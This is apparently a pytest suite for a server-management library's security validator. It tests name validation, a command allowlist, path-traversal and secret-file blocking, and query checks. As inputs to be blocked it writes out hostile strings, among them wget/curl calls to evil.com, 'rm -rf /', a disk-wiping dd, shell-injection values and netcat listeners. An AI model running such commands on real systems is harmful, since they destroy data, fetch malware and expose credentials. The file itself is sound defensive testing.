"""
Tests for server_management_lib.security module.

Covers:
- Device name validation (block devices)
- Service name validation
- Command safety (whitelist + dangerous pattern blocking)
- File path validation (traversal prevention)
- Database query validation (InfluxDB + Prometheus)
- Log search pattern and time-filter validation
- SMART test type validation
"""

import pytest

from server_management_lib.security import (
    FileAccess,
    SecurityValidator,
)

# ============================================================================
# Device Name Validation
# ============================================================================


class TestDeviceNameValidation:
    """Test block device name validation."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_valid_names(self):
        valid = [
            "sda",
            "sdb",
            "nvme0n1",
            "nvme1n2",
            "vda",
            "hda",
            "mmcblk0",
            "dm-0",
        ]
        for name in valid:
            assert self.security.validate_device_name(name) is True

    def test_invalid_names(self):
        invalid = [
            "",
            "sda;rm -rf /",
            "sda$(whoami)",
            "../../etc",
            "/dev/sda",
            "a" * 33,
            None,
        ]
        for name in invalid:
            assert self.security.validate_device_name(name) is False

    def test_none_input(self):
        assert self.security.validate_device_name(None) is False

    def test_empty_input(self):
        assert self.security.validate_device_name("") is False

    def test_too_long(self):
        assert self.security.validate_device_name("a" * 33) is False

    def test_injection_patterns_blocked(self):
        """Device names with injection patterns should be blocked."""
        injection_patterns = [
            "sda;rm",  # semicolon
            "sda|cat",  # pipe
            "sda`whoami`",  # command substitution
            "sda$var",  # variable expansion
            "sda(sub)",  # subshell
            "sda{braces}",  # brace expansion
            "sda<redirect",  # redirect
            "sda\\nescape",  # escape
            "sda'quote",  # quote
            'sda"quote',  # quote
            "sda!hist",  # history
            "sda~home",  # home
            "sda..traversal",  # path traversal
        ]
        for name in injection_patterns:
            assert self.security.validate_device_name(name) is False, (
                f"Should block: {name}"
            )


# ============================================================================
# Service Name Validation
# ============================================================================


class TestServiceNameValidation:
    """Test service name validation."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_valid_names(self):
        valid = [
            "myapp",
            "my-app",
            "my_app",
            "MyApp123",
            "service-01",
            "a",
            "a" * 100,
        ]
        for name in valid:
            assert self.security.validate_service_name(name) is True

    def test_invalid_names(self):
        invalid = [
            "",
            "my app",
            "my/app",
            "../etc",
            "app;rm -rf /",
            "-help",
            "_service",
            None,
        ]
        for name in invalid:
            assert self.security.validate_service_name(name) is False

    def test_none_input(self):
        assert self.security.validate_service_name(None) is False

    def test_empty_input(self):
        assert self.security.validate_service_name("") is False

    def test_too_long(self):
        assert self.security.validate_service_name("a" * 101) is False

    def test_path_traversal_patterns_blocked(self):
        """Service names with path traversal patterns should be blocked."""
        traversal_patterns = [
            "myapp..",  # parent directory
            "my~app",  # home directory
            "my$app",  # variable expansion
            "my`app",  # command substitution
            "my;app",  # command separator
            "my|app",  # pipe
            "my&app",  # background
            "my>app",  # redirect
            "my<app",  # redirect input
            "my(app)",  # subshell
            "my{app}",  # brace expansion
            "my[app]",  # glob
            "my*app",  # glob
            "my?app",  # glob
            "my'app'",  # quote
            'my"app"',  # quote
            "my\\app",  # escape
            "my app",  # space
            "my!app",  # history
            "my#app",  # comment
        ]
        for name in traversal_patterns:
            assert self.security.validate_service_name(name) is False, (
                f"Should block: {name}"
            )


class TestAllowedContainers:
    """Container names allowed outside a service directory."""

    def test_default_is_empty(self):
        assert SecurityValidator({}).allowed_containers == frozenset()

    def test_valid_names_are_kept(self):
        security = SecurityValidator(
            {"security": {"allowed_containers": ["watchtower", "wud"]}}
        )

        assert security.allowed_containers == frozenset({"watchtower", "wud"})

    def test_invalid_names_are_dropped(self):
        security = SecurityValidator(
            {
                "security": {
                    "allowed_containers": [
                        "watchtower",
                        "../../etc",
                        42,
                        "--privileged",
                    ]
                }
            }
        )

        assert security.allowed_containers == frozenset({"watchtower"})

    def test_single_string_is_accepted(self):
        security = SecurityValidator({"security": {"allowed_containers": "watchtower"}})

        assert security.allowed_containers == frozenset({"watchtower"})

    def test_non_list_value_is_ignored(self):
        security = SecurityValidator({"security": {"allowed_containers": 42}})

        assert security.allowed_containers == frozenset()

    def test_none_is_empty(self):
        security = SecurityValidator({"security": {"allowed_containers": None}})

        assert security.allowed_containers == frozenset()


class TestHostUnits:
    """Host infrastructure units are restricted by an explicit allowlist."""

    def test_default_allowlist(self):
        allowed = SecurityValidator({}).allowed_host_units

        assert {
            "telegraf",
            "smartd",
            "docker",
            "snapraid",
            "mergerfs",
            "smbd",
        } <= allowed

    def test_allowlisted_unit_is_accepted(self):
        security = SecurityValidator({})

        assert security.validate_host_unit("telegraf") is True
        assert security.validate_host_unit("docker") is True

    def test_arbitrary_unit_is_rejected(self):
        security = SecurityValidator({})

        for unit in ("sshd", "telegraf.service", "../../etc/passwd", "cron"):
            assert security.validate_host_unit(unit) is False

    def test_injection_and_path_syntax_is_rejected(self):
        security = SecurityValidator({})

        for unit in (
            "telegraf;rm -rf /",
            "telegraf$(id)",
            "telegraf --now",
            "telegraf\nmalicious",
            "",
            None,
            123,
        ):
            assert security.validate_host_unit(unit) is False

    def test_configured_allowlist_replaces_default(self):
        security = SecurityValidator({"security": {"host_units": ["nginx"]}})

        assert security.allowed_host_units == frozenset({"nginx"})
        assert security.validate_host_unit("nginx") is True
        assert security.validate_host_unit("telegraf") is False

    def test_empty_allowlist_disables_host_tools(self):
        security = SecurityValidator({"security": {"host_units": []}})

        assert security.allowed_host_units == frozenset()
        assert security.validate_host_unit("telegraf") is False

    def test_invalid_entries_are_dropped(self):
        security = SecurityValidator(
            {"security": {"host_units": ["nginx", "bad name", 42]}}
        )

        assert security.allowed_host_units == frozenset({"nginx"})


# ============================================================================
# Command Safety
# ============================================================================


class TestHealthDiskPaths:
    """Mount points reported by get_server_health are validated and deduplicated."""

    def test_default_is_root(self):
        assert SecurityValidator({}).health_disk_paths == ("/",)

    def test_configured_paths_preserve_order(self):
        security = SecurityValidator(
            {"health": {"disk_paths": ["/", "/mnt/storage", "/mnt/data1"]}}
        )

        assert security.health_disk_paths == ("/", "/mnt/storage", "/mnt/data1")

    def test_paths_are_normalised_and_deduplicated(self):
        security = SecurityValidator(
            {"health": {"disk_paths": ["/mnt//storage/.", "/mnt/storage", "/"]}}
        )

        assert security.health_disk_paths == ("/mnt/storage", "/")

    def test_single_string_is_accepted(self):
        security = SecurityValidator({"health": {"disk_paths": "/mnt/storage"}})

        assert security.health_disk_paths == ("/mnt/storage",)

    def test_invalid_entries_are_dropped(self):
        security = SecurityValidator(
            {
                "health": {
                    "disk_paths": [
                        "/mnt/storage",
                        "relative/path",
                        "/mnt/../etc",
                        "/mnt/storage;rm -rf /",
                        "/mnt/$(id)",
                        "~/storage",
                        42,
                    ]
                }
            }
        )

        assert security.health_disk_paths == ("/mnt/storage",)

    def test_no_valid_entry_falls_back_to_root(self):
        security = SecurityValidator({"health": {"disk_paths": []}})

        assert security.health_disk_paths == ("/",)

    def test_non_list_value_falls_back_to_root(self):
        security = SecurityValidator({"health": {"disk_paths": 42}})

        assert security.health_disk_paths == ("/",)

    def test_non_mapping_section_falls_back_to_root(self):
        security = SecurityValidator({"health": "/mnt/storage"})

        assert security.health_disk_paths == ("/",)

    def test_none_falls_back_to_root(self):
        security = SecurityValidator({"health": {"disk_paths": None}})

        assert security.health_disk_paths == ("/",)

    def test_validate_disk_path_rejects_control_characters(self):
        security = SecurityValidator({})

        assert security.validate_disk_path("/mnt/storage\n/malicious") is None


class TestCommandSafety:
    """Test command safety validation."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_disk_safe_commands_accepted(self):
        """Disk diagnostic catalog commands must pass the allowlist."""
        safe = [
            "smartctl -a /dev/sda",
            "/usr/sbin/smartctl -j -a /dev/sda",
            "/usr/sbin/smartctl --version",
            "/usr/sbin/smartctl -n standby -t short /dev/sda",
            "/usr/sbin/smartctl -t short /dev/sda",
            "/usr/sbin/smartctl -t long /dev/sda",
            "lsblk -d -o NAME,MODEL,SERIAL,SIZE,TYPE,TRAN --json",
            "zpool status -x",
            "zpool list -o name,size,alloc,free,cap,dedup,health",
            "cat /proc/mdstat",
            "mdadm --detail --scan --verbose",
            "iostat -x 1 1",
            "snapraid status",
            "findmnt --real -o TARGET,SOURCE,FSTYPE,SIZE,USED,AVAIL,USE%",
            "findmnt -t fuse.mergerfs -o TARGET,SOURCE,FSTYPE,OPTIONS",
            "df -h -x tmpfs -x devtmpfs -x overlay -x squashfs",
        ]
        for cmd in safe:
            assert self.security.is_command_safe(cmd) is True, f"Should accept: {cmd}"

    def test_general_safe_commands_accepted(self):
        """remote-server catalog commands must pass the allowlist."""
        safe = [
            "docker ps",
            "docker logs --tail 10 -- myapp",
            "uptime",
            "free -h",
            "df -h /srv",
            "ls -1 /srv/",
            "test -d '/srv/my app'",
            "echo 'Connection successful'",
            "systemctl status --no-pager --full telegraf",
            "journalctl -u telegraf -n 200 --no-pager --output short-iso",
        ]
        for cmd in safe:
            assert self.security.is_command_safe(cmd) is True, f"Should accept: {cmd}"

    def test_dangerous_commands_blocked(self):
        """Dangerous commands must always be blocked."""
        dangerous = [
            "sudo smartctl -a /dev/sda",
            "dd if=/dev/zero of=/dev/sda",
            "rm -rf /",
            "bash /tmp/evil.sh",
            "wget http://evil.com/malware",
            "curl http://evil.com/exploit",
        ]
        for cmd in dangerous:
            assert self.security.is_command_safe(cmd) is False, f"Should block: {cmd}"

    def test_shell_syntax_blocked(self):
        """Hand-built shell syntax must be rejected even for known executables."""
        dangerous = [
            "smartctl -a /dev/sda > /dev/sda",
            "smartctl -j -a /dev/sda > /tmp/evil",
            "smartctl -a /dev/sda 2>&1",
            "smartctl -a /dev/sda && echo success",
            "lsblk -d || echo failed",
            "docker ps; curl evil",
            "docker ps\ncurl evil",
            "cat /proc/mdstat /etc/shadow",
        ]
        for cmd in dangerous:
            assert self.security.is_command_safe(cmd) is False, f"Should block: {cmd}"

    def test_unknown_commands_blocked(self):
        """Executables outside the catalog are rejected instead of allowed."""
        unknown = [
            "whoami",
            "docker run --privileged alpine",
            "docker exec app sh",
            "smartctl --scan",
            "nvme list",
            "ls -la /",
            "cat /etc/passwd",
        ]
        for cmd in unknown:
            assert self.security.is_command_safe(cmd) is False, f"Should block: {cmd}"

    def test_allow_generic_commands_flag_has_no_effect(self):
        """The legacy config flag must not re-enable arbitrary execution."""
        security = SecurityValidator({"security": {"allow_generic_commands": True}})
        assert security.is_command_safe("whoami") is False
        assert security.is_command_safe("docker exec app sh") is False
        assert security.is_command_safe("smartctl -a /dev/sda") is True

    def test_net_tools_blocked(self):
        """Network exfiltration tools should be blocked."""
        dangerous = [
            "nc -l 1234",
            "ncat -l 1234",
            "netcat -l 1234",
            "socat TCP-LISTEN:1234 -",
            "telnet evil.com",
        ]
        for cmd in dangerous:
            assert self.security.is_command_safe(cmd) is False, f"Should block: {cmd}"


# ============================================================================
# File Path Validation
# ============================================================================


class TestFilePathValidation:
    """Test service file path validation."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_valid_paths(self):
        valid = [
            ("myapp", "docker-compose.yml"),
            ("myapp", "config/app.conf"),
            ("myapp", "logs/app.log"),
        ]
        for service, path in valid:
            result = self.security.validate_service_file_path(service, path)
            assert result is not None, f"Should accept: {path}"

    def test_path_construction_is_lexical(self, tmp_path):
        """The path belongs to the target host, so it must not be resolved here."""
        service_dir = tmp_path / "services" / "myapp"
        service_dir.mkdir(parents=True)
        outside = tmp_path / "outside"
        outside.mkdir()
        (service_dir / "link").symlink_to(outside)

        security = SecurityValidator(
            {"security": {"services_path": str(tmp_path / "services")}}
        )
        result = security.validate_service_file_path("myapp", "link/file.txt")

        assert result == f"{service_dir}/link/file.txt"
        assert str(outside) not in result

    def test_dot_components_are_normalised_lexically(self):
        result = self.security.validate_service_file_path("myapp", "logs/./app.log")
        assert result == "/srv/myapp/logs/app.log"

    def test_service_must_be_a_single_path_component(self):
        for service in ("", ".", "..", "/etc", "../myapp", "myapp/other"):
            check = self.security.check_service_file_path(service, "config.yml")
            assert check.path is None, f"Should reject service: {service!r}"
            assert check.access is FileAccess.BLOCKED_INVALID

    def test_valid_paths_return_correct_structure(self):
        """Valid file paths should return paths within /srv/{service}/."""

        valid_paths = [
            ("myapp", "docker-compose.yml"),
            ("myapp", "config.yaml"),
            ("myapp", "subdir/file.txt"),
        ]
        for service, path in valid_paths:
            result = self.security.validate_service_file_path(service, path)
            assert result is not None, f"Should accept: {path}"
            assert "/srv/myapp/" in result

    def test_traversal_blocked(self):
        attacks = [
            ("myapp", "../etc/passwd"),
            ("myapp", "../../etc/shadow"),
            ("myapp", "/etc/passwd"),
        ]
        for service, path in attacks:
            result = self.security.validate_service_file_path(service, path)
            assert result is None, f"Should block: {path}"

    def test_sensitive_files_blocked(self):
        sensitive = [
            ("myapp", "secrets/password.txt"),
            ("myapp", "keys/server.key"),
            ("myapp", "certs/server.pem"),
            ("myapp", "credentials.json"),
            ("myapp", "token.txt"),
            ("myapp", ".ssh/id_rsa"),
            ("myapp", "config/id_ed25519"),
            ("myapp", ".git/config"),
        ]
        for service, path in sensitive:
            result = self.security.validate_service_file_path(service, path)
            assert result is None, f"Should block sensitive file: {path}"

    def test_sensitive_files_report_a_policy_block(self):
        check = self.security.check_service_file_path("myapp", "keys/server.key")
        assert check.path is None
        assert check.access is FileAccess.BLOCKED_SENSITIVE
        assert check.reason

    def test_sensitive_matching_is_not_substring_based(self):
        """Components like 'monkey' or 'tokenizer' are not secret names."""
        allowed = [
            ("myapp", "monkey.txt"),
            ("myapp", "tokenizer.json"),
            ("myapp", "hockey.txt"),
            ("myapp", "keyboard.conf"),
        ]
        for service, path in allowed:
            result = self.security.validate_service_file_path(service, path)
            assert result is not None, f"Should accept: {path}"

    def test_env_files_are_readable_but_redacted(self):
        for path in [
            ".env",
            ".env.local",
            ".env.production",
            ".envrc",
            "config/app.env",
        ]:
            check = self.security.check_service_file_path("myapp", path)
            assert check.path is not None, f"Should accept: {path}"
            assert check.access is FileAccess.REDACT, f"Should redact: {path}"

    def test_regular_files_are_not_redacted(self):
        check = self.security.check_service_file_path("myapp", "docker-compose.yml")
        assert check.path is not None
        assert check.access is FileAccess.ALLOW

    def test_none_input(self):
        result = self.security.validate_service_file_path("myapp", None)
        assert result is None

    def test_empty_input(self):
        result = self.security.validate_service_file_path("myapp", "")
        assert result is None

    def test_too_long(self):
        result = self.security.validate_service_file_path("myapp", "a" * 501)
        assert result is None

    def test_null_byte(self):
        result = self.security.validate_service_file_path("myapp", "file\x00.txt")
        assert result is None

    def test_url_encoded_traversal(self):
        result = self.security.validate_service_file_path("myapp", "%2e%2e/etc/passwd")
        assert result is None

    def test_unicode_variants(self):
        result = self.security.validate_service_file_path("myapp", "\uff0e\uff0e/etc")
        assert result is None

    def test_absolute_path_rejected(self):
        result = self.security.validate_service_file_path("myapp", "/etc/passwd")
        assert result is None

    def test_resolution_escape(self):
        """Path resolution that escapes service directory should be blocked."""
        result = self.security.validate_service_file_path(
            "myapp", "..%2f..%2fetc/passwd"
        )
        assert result is None

    def test_resolution_error_handling(self):
        """Path resolution errors should be handled gracefully."""
        result = self.security.validate_service_file_path("myapp", "file\x00name.txt")
        assert result is None


# ============================================================================
# Query Validation
# ============================================================================


class TestInfluxDBQueryValidation:
    """InfluxDB SQL validation is semantic, not a shell-character blacklist."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_valid_selects(self):
        valid = [
            "SELECT * FROM cpu WHERE time > now() - INTERVAL '1 hour' LIMIT 5",
            "SELECT mean(value) FROM metrics GROUP BY host",
            "WITH recent AS (SELECT * FROM cpu) SELECT * FROM recent",
        ]
        for query in valid:
            assert self.security.validate_influxdb_query(query) is not None

    def test_trailing_semicolon_is_accepted(self):
        result = self.security.validate_influxdb_query("SELECT * FROM cpu;")
        assert result == "SELECT * FROM cpu"

    def test_quotes_identifiers_and_operators_are_accepted(self):
        queries = [
            'SELECT * FROM "cpu load" WHERE usage >= 0.9',
            "SELECT * FROM cpu WHERE host = 'server-1'",
        ]
        for query in queries:
            assert self.security.validate_influxdb_query(query) is not None

    def test_comments_are_accepted(self):
        queries = [
            "SELECT * FROM cpu -- operator note",
            "SELECT * FROM cpu /* operator note */",
        ]
        for query in queries:
            assert self.security.validate_influxdb_query(query) is not None

    def test_multiple_statements_blocked(self):
        injections = [
            "SELECT * FROM cpu; DROP TABLE metrics",
            "SELECT * FROM cpu\nDELETE FROM metrics",
        ]
        for query in injections:
            assert self.security.validate_influxdb_query(query) is None

    def test_write_ops_blocked(self):
        write_ops = [
            "DROP MEASUREMENT cpu",
            "DELETE FROM metrics",
            "INSERT INTO cpu VALUES (1)",
            "UPDATE metrics SET value = 100",
            "ALTER TABLE cpu ADD COLUMN x INT",
            "CREATE DATABASE testdb",
            "TRUNCATE TABLE logs",
            "GRANT ALL TO admin",
            "REVOKE READ FROM user",
            "KILL QUERY 12345",
            "SET PASSWORD FOR user = 'pass'",
            "SELECT * FROM cpu INTO other",
        ]
        for query in write_ops:
            assert self.security.validate_influxdb_query(query) is None, query

    def test_null_byte_blocked(self):
        assert self.security.validate_influxdb_query("SELECT * FROM cpu\x00") is None

    def test_none_and_empty_input(self):
        assert self.security.validate_influxdb_query(None) is None
        assert self.security.validate_influxdb_query("") is None

    def test_non_string_input(self):
        assert self.security.validate_influxdb_query(123) is None

    def test_too_long(self):
        assert self.security.validate_influxdb_query("SELECT " + "a" * 5000) is None


class TestPrometheusQueryValidation:
    """PromQL is sent over HTTP: quotes, braces and comparisons are valid."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_label_matchers_accepted(self):
        queries = [
            'up{job="node"}',
            'node_filesystem_avail_bytes{device="/dev/sda1"}',
            "up{job='node'}",
        ]
        for query in queries:
            assert self.security.validate_prometheus_query(query) is not None

    def test_comparisons_accepted(self):
        queries = ["up > 0", "up == 0", "node_load1 >= 2"]
        for query in queries:
            assert self.security.validate_prometheus_query(query) is not None

    def test_functions_accepted(self):
        queries = [
            "rate(http_requests_total[5m])",
            "histogram_quantile(0.95, rate(bucket[5m]))",
        ]
        for query in queries:
            assert self.security.validate_prometheus_query(query) is not None

    def test_shell_metacharacters_are_not_interpreted(self):
        # These are invalid PromQL, but they are just HTTP query text; the
        # Prometheus API will reject them. They are never executed by a shell.
        assert (
            self.security.validate_prometheus_query("up; cat /etc/passwd") is not None
        )

    def test_null_byte_blocked(self):
        assert self.security.validate_prometheus_query("up\x00") is None

    def test_control_characters_blocked(self):
        assert self.security.validate_prometheus_query("up\x01") is None

    def test_none_and_empty_input(self):
        assert self.security.validate_prometheus_query(None) is None
        assert self.security.validate_prometheus_query("") is None

    def test_non_string_input(self):
        assert self.security.validate_prometheus_query(123) is None

    def test_too_long(self):
        assert self.security.validate_prometheus_query("up" + "a" * 5000) is None


# ============================================================================
# Search Pattern Sanitization
# ============================================================================


class TestSearchPatternValidation:
    """Log search patterns are matched locally, so they are never rewritten."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_patterns_are_preserved_exactly(self):
        patterns = [
            "error",
            "connection failed",
            "192.168.1.1",
            'it\'s a quoted "value"',
            "'; rm -rf /",
            "$(whoami)",
            "error;ls|cat",
            "!important #tag ~home",
            "$(rm -rf /)",
        ]
        for pattern in patterns:
            assert self.security.validate_search_pattern(pattern) == pattern

    def test_empty_pattern_raises(self):
        with pytest.raises(ValueError, match="empty"):
            self.security.validate_search_pattern("")

    def test_none_input_raises(self):
        with pytest.raises(ValueError, match="empty"):
            self.security.validate_search_pattern(None)  # type: ignore[arg-type]

    def test_non_string_input_raises(self):
        with pytest.raises(ValueError, match="empty"):
            self.security.validate_search_pattern(123)  # type: ignore[arg-type]

    def test_long_pattern_raises(self):
        with pytest.raises(ValueError, match="too long"):
            self.security.validate_search_pattern("a" * 201)

    @pytest.mark.parametrize("pattern", ["bad\npattern", "bad\tpattern", "bad\x00"])
    def test_control_characters_raise(self, pattern):
        with pytest.raises(ValueError, match="control characters"):
            self.security.validate_search_pattern(pattern)


class TestLogTimeValidation:
    """``docker logs --since/--until`` accepts a bounded set of formats."""

    @pytest.fixture
    def security(self):
        return SecurityValidator({})

    @pytest.mark.parametrize(
        "value",
        [
            "2026-10-18T21:00:00Z",
            "2026-10-18T21:00:00.123456+02:00",
            "2026-10-18",
            "30m",
            "1h30m",
            "2.5s",
            "500ms",
        ],
    )
    def test_valid_values(self, security, value):
        assert security.validate_log_time(value) is True

    @pytest.mark.parametrize(
        "value",
        [
            "",
            None,
            "--help",
            "-1h",
            "yesterday",
            "1h30",
            "2026-13-99T99:00:00Z",
            "2026-10-18 21:00:00",
            "a" * 65,
        ],
    )
    def test_invalid_values(self, security, value):
        assert security.validate_log_time(value) is False  # type: ignore[arg-type]


# ============================================================================
# SMART Test Type Validation
# ============================================================================


class TestSMARTTestTypeValidation:
    """Test SMART self-test type validation."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_valid_types(self):
        assert self.security.validate_smart_test_type("short") is True
        assert self.security.validate_smart_test_type("long") is True
        assert self.security.validate_smart_test_type("conveyance") is True

    def test_invalid_types(self):
        assert self.security.validate_smart_test_type("invalid") is False
        assert self.security.validate_smart_test_type("") is False
        assert self.security.validate_smart_test_type(None) is False


# ============================================================================
# Container runtime and compose policy
# ============================================================================


class TestContainerRuntime:
    def test_default_is_docker(self):
        assert SecurityValidator({}).container_runtime == "docker"

    @pytest.mark.parametrize("runtime", ["docker", "podman", "nerdctl", "Podman"])
    def test_valid_runtime(self, runtime):
        security = SecurityValidator({"container_runtime": runtime})
        assert security.container_runtime == runtime.lower()

    @pytest.mark.parametrize("runtime", ["containerd", "", 42, None])
    def test_invalid_runtime_falls_back_to_docker(self, runtime):
        security = SecurityValidator({"container_runtime": runtime})
        assert security.container_runtime == "docker"

    @pytest.mark.parametrize("runtime", ["podman", "nerdctl"])
    def test_runtime_catalog_commands_are_allowed(self, runtime):
        security = SecurityValidator({})
        commands = [
            f"{runtime} ps -a --format '{{{{.Names}}}}'",
            f"{runtime} logs --tail 5 -- app",
            f"{runtime} inspect --format '{{{{.Name}}}}' -- app",
            f"{runtime} restart -- app",
            f"{runtime} stop -- app",
        ]
        for command in commands:
            assert security.is_command_safe(command) is True, command


class TestComposeCommandPolicy:
    def setup_method(self):
        self.security = SecurityValidator({"security": {"services_path": "/srv"}})

    @pytest.mark.parametrize("runtime", ["docker", "podman", "nerdctl"])
    @pytest.mark.parametrize(
        "tail",
        [
            "ps --format '{{.Name}} {{.Status}}'",
            "ps",
            "pull",
            "up -d --remove-orphans",
            "up -d",
            "down --remove-orphans",
            "down",
        ],
    )
    def test_catalog_compose_commands_are_allowed(self, runtime, tail):
        command = f"{runtime} compose --project-directory /srv/app {tail}"
        assert self.security.is_command_safe(command) is True, command

    @pytest.mark.parametrize(
        "command",
        [
            # unknown or dangerous subcommands
            "docker compose --project-directory /srv/app restart",
            "docker compose --project-directory /srv/app run evil",
            "docker compose --project-directory /srv/app exec app sh",
            # outside services_path
            "docker compose --project-directory /etc down",
            "docker compose --project-directory /srv/../etc down",
            # extra or unknown arguments
            "docker compose --project-directory /srv/app up --build",
            "docker compose --project-directory /srv/app pull --quiet",
            "docker compose --project-directory /srv/app ps --all",
            # runtime and shape
            "containerd compose --project-directory /srv/app ps",
            "docker compose --projects-directory /srv/app ps",
            "docker compose /srv/app ps",
        ],
    )
    def test_non_catalog_compose_commands_are_rejected(self, command):
        assert self.security.is_command_safe(command) is False, command

    def test_compose_respects_configured_services_path(self):
        security = SecurityValidator({"security": {"services_path": "/opt/services"}})

        assert (
            security.is_command_safe(
                "docker compose --project-directory /opt/services/app ps"
            )
            is True
        )
        assert (
            security.is_command_safe("docker compose --project-directory /srv/app ps")
            is False
        )
